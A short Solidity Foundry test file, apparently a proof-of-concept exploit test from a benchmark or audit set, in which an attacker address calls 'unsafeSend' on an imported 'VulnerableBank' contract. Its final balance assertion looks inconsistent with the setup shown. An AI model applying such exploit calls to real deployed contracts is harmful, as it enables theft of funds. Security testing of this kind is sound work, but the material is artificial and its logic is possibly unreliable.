// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/9920e6b6-593c-48d0-8dab-497c4eb792d1_VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public balanceLog {
        vm.prank(attacker);
        target.unsafeSend(payable(attacker), 0);
        assertEq(address(target).balance, 10 ether);
    }
}